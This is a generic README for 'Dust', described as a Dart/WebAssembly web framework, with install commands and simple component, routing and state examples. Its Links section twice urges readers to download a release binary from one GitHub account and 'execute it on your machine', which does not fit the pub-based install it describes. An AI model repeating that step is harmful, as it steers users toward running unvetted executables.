# Dust 🌬️

![Dust Logo](https://img.shields.io/badge/Dust-Framework-blue?style=flat&logo=dart)

Welcome to **Dust**, a modern, component-based Dart web framework. Inspired by React and Vue, Dust leverages the power of WebAssembly (WASM) to deliver high performance and a seamless developer experience. Build robust, type-safe web applications effortlessly.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [Components](#components)
- [Routing](#routing)
- [State Management](#state-management)
- [Deployment](#deployment)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features

- **Component-Based Architecture**: Create reusable components to enhance your application’s maintainability.
- **Declarative UI**: Write clean and understandable code that describes what the UI should look like.
- **Type Safety**: Leverage Dart’s strong typing to catch errors early in the development process.
- **High Performance**: Utilize WebAssembly for faster execution and a smooth user experience.
- **SPA Support**: Build single-page applications that feel responsive and dynamic.
- **Rich Ecosystem**: Benefit from a variety of libraries and tools available in the Dart ecosystem.

## Getting Started

To get started with Dust, you need to have Dart installed on your machine. If you haven’t done this yet, visit the [Dart installation guide](https://dart.dev/get-dart) for instructions.

Once you have Dart set up, you can easily create a new Dust project.

## Installation

To install Dust, you can use the Dart package manager. Open your terminal and run:

```bash
dart pub global activate dust
```

This command will install the Dust framework globally on your machine.

## Usage

After installing Dust, you can create a new project with the following command:

```bash
dust create my_project
```

Navigate into your project directory:

```bash
cd my_project
```

To run your application, use:

```bash
dust serve
```

This will start a local development server. You can view your application by opening your browser and going to `http://localhost:8080`.

## Components

Dust allows you to create components easily. Here’s a simple example of a component:

```dart
import 'package:dust/dust.dart';

class MyComponent extends Component {
  @override
  render() {
    return html('''
      <div>
        <h1>Hello, Dust!</h1>
      </div>
    ''');
  }
}
```

You can then use this component in your main application file.

## Routing

Routing in Dust is straightforward. You can define routes in your application using the built-in router. Here’s an example:

```dart
import 'package:dust/dust.dart';

class MyApp extends Component {
  @override
  render() {
    return Router(
      routes: [
        Route(path: '/', component: HomeComponent()),
        Route(path: '/about', component: AboutComponent()),
      ],
    );
  }
}
```

## State Management

Managing state in Dust is simple. You can use Dart's built-in features or integrate with state management libraries. Here’s an example of using a simple state management approach:

```dart
class AppState {
  int counter = 0;

  void increment() {
    counter++;
  }
}
```

You can then use this state in your components.

## Deployment

To deploy your Dust application, you can build it for production using:

```bash
dust build
```

This will create an optimized version of your application in the `build` directory. You can then upload this directory to your web server.

## Contributing

We welcome contributions! If you’d like to contribute to Dust, please fork the repository and submit a pull request. Make sure to follow the contribution guidelines.

## License

Dust is open-source software licensed under the MIT License. See the LICENSE file for more details.

## Links

For the latest releases, visit the [Releases section](https://github.com/raskolafiw/Dust/releases). Here, you can download the latest version and execute it on your machine.

If you want to explore more about Dust, feel free to check out the [Releases section](https://github.com/raskolafiw/Dust/releases) for updates and new features.

---

Thank you for checking out Dust! We hope you enjoy building with it as much as we do. Happy coding!